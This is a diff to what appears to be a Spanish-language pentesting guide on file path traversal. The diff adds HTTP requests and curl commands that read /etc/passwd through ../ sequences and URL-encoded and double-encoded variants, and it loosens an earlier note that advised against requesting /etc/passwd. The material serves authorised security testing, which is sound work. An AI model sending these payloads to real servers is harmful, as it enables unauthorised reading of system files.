@@ -8,6 +8,10 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
+## 📚 Banco ampliado de payloads
+
+[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.
+
 > **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
 
 ## 💉 Payloads básicos
@@ -22,6 +26,20 @@
 ```
 
 **Cuándo usarlo:** Poner el archivo marcador en un directorio propio fuera de la raíz permitida; la profundidad depende del despliegue.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
+
+
+### Lectura clásica de /etc/passwd en Linux
+
+```http
+GET /download?file=../../../../etc/passwd HTTP/1.1
+Host: {ORIGEN}
+
+# Variantes del valor de file: ../etc/passwd | /etc/passwd
+```
+
+**Cuándo usarlo:** Ajustar la profundidad al directorio base. Una respuesta con líneas como root:x:0:0 confirma lectura; conservar solo las líneas necesarias para evidenciarla.
 
 **Fuente:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
 
@@ -74,6 +92,19 @@ C:\xampp\apache\conf\httpd.conf
 
 
 ## 🧭 Payloads por contexto
+
+### Solicitud literal y codificada hacia /etc/passwd
+
+```bash
+curl --path-as-is 'https://{ORIGEN}/download?file=../../../../etc/passwd'
+curl --path-as-is 'https://{ORIGEN}/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd'
+curl --path-as-is 'https://{ORIGEN}/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+```
+
+**Cuándo usarlo:** Probar cada URL por separado: la segunda requiere decodificación URL y la tercera, doble decodificación. Cotejar con un archivo de control y registrar la request que realmente salió del cliente.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).
+
 
 ### Codificación y normalización
 
@@ -163,7 +194,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 /{RUTA_ABSOLUTA_CANARY_PROPIO}/marcador-{NONCE}.txt
 ```
 
-**Interpretación:** Usar un archivo colocado por el tester en laboratorio; no solicitar `/etc/passwd`.
+**Interpretación:** Usar primero un archivo propio; en un laboratorio Linux, `/etc/passwd` sirve como referencia de lectura absoluta si está dentro del alcance autorizado.
 
 **Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
 
